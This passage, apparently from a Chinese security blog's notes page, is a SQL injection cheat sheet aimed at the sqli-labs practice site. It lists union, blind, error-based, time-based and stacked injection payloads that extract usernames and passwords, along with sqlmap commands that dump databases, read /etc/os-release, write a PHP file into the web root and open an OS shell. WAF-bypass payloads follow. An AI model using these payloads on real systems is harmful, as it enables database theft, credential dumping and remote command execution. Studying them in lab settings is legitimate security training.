class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">2</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27; <span class="hljs-built_in">union</span>……<span class="hljs-meta">#</span><br><br>获取字段数量，查看回显位置<br><span class="hljs-number">-1</span>&#x27; order by <span class="hljs-number">4</span><span class="hljs-meta">#</span><br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-meta">#</span><br><br>查询库<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">database</span>()<span class="hljs-meta">#</span><br><br>查询库中表名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,table_name from information_schema.tables <span class="hljs-built_in">where</span> table_schema=<span class="hljs-built_in">database</span>() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查询字段名<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-built_in">group_concat</span>(column_name) from information_schema.columns <span class="hljs-built_in">where</span> table_name=&#x27;users&#x27; limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><span class="hljs-meta">#</span><br><br>查数据<br><span class="hljs-number">-1</span>&#x27; <span class="hljs-built_in">union</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,id from sqli.users limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span><br><br></code></pre></td></tr></table></figure><h3 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h3><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-string">&#x27; and substr(database(),1,1)=&#x27;</span>s<span class="hljs-string">&#x27;--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> length(<span class="hljs-keyword">database</span>())&gt;=<span class="hljs-number">1</span><span class="hljs-comment">--+</span><br><span class="hljs-number">1</span><span class="hljs-string">&#x27; and length(select database())&gt;=1--+</span><br><span class="hljs-string">1&#x27;</span> <span class="hljs-keyword">and</span> ascii(substr((<span class="hljs-keyword">database</span>(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))&gt;<span class="hljs-number">80</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h3><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml"></a>updatexml</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">0x3a</span>、<span class="hljs-number">0x7e</span>是为了在xpath中是语法错误的<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x3a</span>,<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x3a</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> ),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">limit</span> <span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">描述：使用xpath表示法从<span class="hljs-type">XML</span>字符串中提取值<br>xml_docment:<span class="hljs-type">xml</span>标记<br>Xpthstring: 显示输入语句<br>new_value:新值<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat(<span class="hljs-keyword">database</span>())))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>))))<span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,concat((<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>))))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(id,<span class="hljs-number">0x7e</span>,username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="floor"><a href="#floor" class="headerlink" title="floor()"></a>floor()</h4><p>floor的讲解参考：<a href="https://www.cnblogs.com/litlife/p/8472323.html">https://www.cnblogs.com/litlife/p/8472323.html</a></p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">floor,count,<span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span>冲突报错<br>数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> count(*),concat(<span class="hljs-keyword">database</span>(),<span class="hljs-number">0x7e</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x) a)<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">table_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count(),concat(<span class="hljs-string">&#x27;~&#x27;</span>,(<span class="hljs-keyword">select</span> <span class="hljs-built_in">column_name</span> <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;~&#x27;</span>,floor(rand(<span class="hljs-number">0</span>)<span class="hljs-number">2</span>)) <span class="hljs-keyword">as</span> a <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> (<span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> count() ,concat(<span class="hljs-string">&#x27;~&#x27;</span>(<span class="hljs-keyword">select</span> concat(username,&quot;;&quot;,<span class="hljs-keyword">password</span>,&quot;;&quot;)<span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">limit</span> <span class="hljs-number">5</span>,<span class="hljs-number">1</span>),floor(rand(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a) <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">数据库名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">database</span>())x))<span class="hljs-comment">--+</span><br>表名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span>)x))<span class="hljs-comment">-- +</span><br>字段名：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span>)x))<span class="hljs-comment">--+</span><br>数据：<br>http://<span class="hljs-number">127.0</span><span class="hljs-number">.0</span><span class="hljs-number">.1</span>/sqli/Less<span class="hljs-number">-2</span>/?id=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> exp(~(<span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> group_concat(username,<span class="hljs-number">0x7e</span>,<span class="hljs-keyword">password</span>) <span class="hljs-keyword">from</span> <span class="hljs-keyword">security</span>.users)x))<span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h4 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h4><p>参考<a href="https://blog.csdn.net/weixin_54217950/article/details/122938063">https://blog.csdn.net/weixin_54217950/article/details/122938063</a></p><p>如果显示不完整：<br>substring(database(),5,10)<br>Substring是字符截取函数，从数据里面第五个字符开始截取十个字符</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p><code>if(expr1,expr2,expr3)</code>-&gt;如果expr1是true，则返回expr2；否则返回expr3。</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">1</span>&#x27; and if(length(database())&gt;<span class="hljs-number">1</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-attribute">1</span>&#x27; and if(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)=&#x27;s&#x27;,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br><span class="hljs-comment">#用ascii码的好处：MYSQL不区分大小写&#x27;s&#x27;=&#x27;S&#x27;为真</span><br><span class="hljs-attribute">1</span>&#x27; and if(ord(substr(database(),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>))=<span class="hljs-number">114</span>,sleep(<span class="hljs-number">5</span>),<span class="hljs-number">1</span>)--+<br></code></pre></td></tr></table></figure><h3 id="堆叠注入"><a href="#堆叠注入" class="headerlink" title="堆叠注入"></a>堆叠注入</h3><figure class="highlight gauss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs gauss"><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>;<span class="hljs-keyword">show</span> databases;<br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> tables<span class="hljs-meta">#</span><br><span class="hljs-number">1</span>&#x27;;<span class="hljs-keyword">show</span> columns from words<span class="hljs-meta">#</span><br></code></pre></td></tr></table></figure><h3 id="改表、字段名"><a href="#改表、字段名" class="headerlink" title="改表、字段名"></a>改表、字段名</h3><p>有words表和1919810931114514表情况下</p><pre><code class="hljs"> 1. 将表words的名称改为其他的（如words1）， 2. 将1919810931114514改为words. 3. 将flag改为id, 4. 在输入栏中输入1&#39; or 1=1,将其中的数据全部输出，即为flag.</code></pre><p>  语句：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> words <span class="hljs-keyword">to</span> words1 ;<br><span class="hljs-keyword">rename</span> <span class="hljs-keyword">tables</span> <span class="hljs-number">1919810931114514</span> <span class="hljs-keyword">to</span> words ;<br><span class="hljs-keyword">alter</span> <span class="hljs-keyword">table</span> words change flag id <span class="hljs-type">varchar</span>(<span class="hljs-number">100</span>);#<br></code></pre></td></tr></table></figure><p>sqlmap使用</p><p>参考资料：<a href="https://blog.csdn.net/u011377996/article/details/81368482">https://blog.csdn.net/u011377996/article/details/81368482</a><br>sql注入的防御：<br><a href="https://blog.51cto.com/u_12332766/2137035">https://blog.51cto.com/u_12332766/2137035</a><br><a href="https://www.freebuf.com/vuls/265308.html">https://www.freebuf.com/vuls/265308.html</a></p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">常用语句：<br>判断是否存在注入 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1<br>读取日志的请求进行检测 sqlmap -l request.txt<br>查询当前的所有数据库 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dbs</span><br>获取数据库下的表名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>获取表中的字段名 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取字段的内容 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users -C username,password <span class="hljs-params">--dump</span><br>获取数据库的所有用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--users</span><br>获取数据库用户的密码 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--password</span><br>获取当前数据库的名称 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>获取当前数据库的用户 sqlmap.py -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-user</span><br>sqlmap获取数据库名、数据库表、数据库字段<br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--current-db</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security <span class="hljs-params">--tables</span><br>sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--columns</span><br>获取指定表中的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 -D security -T users <span class="hljs-params">--dump</span><br>获取所有表的数据 sqlmap -u http:<span class="hljs-string">//127.0.0.1/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--dump-all</span><br>sqlmap读取系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-read=/etc/os-release</span><br>sqlmap写入系统文件 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--file-write=/root/test</span>.php <span class="hljs-params">--file-dest=/var/www/html/test</span>.php<br>sqlmap执行系统命令 sqlmap -u http:<span class="hljs-string">//192.168.75.141/sqli-labs/Less-1/</span>?id=1 <span class="hljs-params">--os-shell</span><br><br>参数：<br><br><span class="hljs-params">--level</span> 探测等级：1-5，默认为1，等级越高，payload越多，速度越慢。HTTP cookei在level为2时就会测试，HTTP User-Agent/Referer在level为3时就会测试。<br><span class="hljs-params">--risk</span> 危险登录：1-3，默认为1，等级越高，越可能对数据库造成破坏<br><span class="hljs-params">--id-dba</span> 确认当前用户为管理权限（是否为root权限，mssql下最高权限为sa）<br><span class="hljs-params">--sql-shell</span> 运行自定义sql语句<br><span class="hljs-params">--os-cmd</span>,<span class="hljs-params">--os-shell</span> 运行任意操作系统命令<br><span class="hljs-params">--file-read</span> 从数据库服务器中读取文件<br><span class="hljs-params">--file-write</span> 上传文件到数据库服务器中<br><span class="hljs-params">--flush-session</span> 清空已保存的会话信息<br><span class="hljs-params">--dbs</span> 所有数据库<br><span class="hljs-params">--current-db</span> 网站当前数据库<br><span class="hljs-params">--users</span> 所有数据库用户<br><span class="hljs-params">--current-user</span> 当前数据库用户<br><span class="hljs-params">--random-agent</span> 构造随机user-agent<br><span class="hljs-params">--passwords</span> 数据库密码<br><span class="hljs-params">--proxy</span> http:<span class="hljs-string">//local</span><span class="hljs-function">:8080</span> –threads 10 <span class="hljs-params">(可以自定义线程加速)</span> 代理<br><span class="hljs-params">--time-sec=TIMESEC</span> DBMS响应的延迟时间（默认为5秒)<br><span class="hljs-params">--threads=</span> 使用多少线程<br></code></pre></td></tr></table></figure><h2 id="Bypass-waf"><a href="#Bypass-waf" class="headerlink" title="Bypass waf"></a>Bypass waf</h2><p>绕过and、or</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs 1c">if((<span class="hljs-number">1</span>=<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">2</span>)<br><span class="hljs-string">||</span><br><span class="hljs-meta">&amp;&amp;</span><br></code></pre></td></tr></table></figure><p>绕过空格</p><figure class="highlight gcode"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gcode"><span class="hljs-meta">%</span><span class="hljs-number">0</span>a<br><span class="hljs-comment">/**/</span><br></code></pre></td></tr></table></figure><p>绕过order by</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/</span>order<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>by <span class="hljs-number">3</span><br></code></pre></td></tr></table></figure><p>绕过union select</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span><br>unIon<br>selECt<br></code></pre></td></tr></table></figure><p>绕过database(),user()</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span> <span class="hljs-number">1</span>,database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/),user(/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>)<br></code></pre></td></tr></table></figure><p>获取表名</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-number">1</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/*//////*/</span><span class="hljs-comment">/*!50441select*/</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>(<span class="hljs-comment">/*///*/</span>)<br></code></pre></td></tr></table></figure><p>获取列名</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-number">1</span><span class="hljs-regexp">/**/u</span>nion<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span><span class="hljs-regexp">/*!50441select*/</span>%<span class="hljs-number">201</span>,<span class="hljs-number">2</span>,group_concat(column_name) from information_schema.columns where%<span class="hljs-number">20</span>table_schema=database(<span class="hljs-regexp">/*/</span><span class="hljs-regexp">//</span>*<span class="hljs-regexp">/) and/</span>*<span class="hljs-regexp">//</span><span class="hljs-regexp">//</span><span class="hljs-regexp">/*/</span>table_name=<span class="hljs-string">&quot;admin&quot;</span><br></code></pre></td></tr></table></figure><p>获取数据</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span 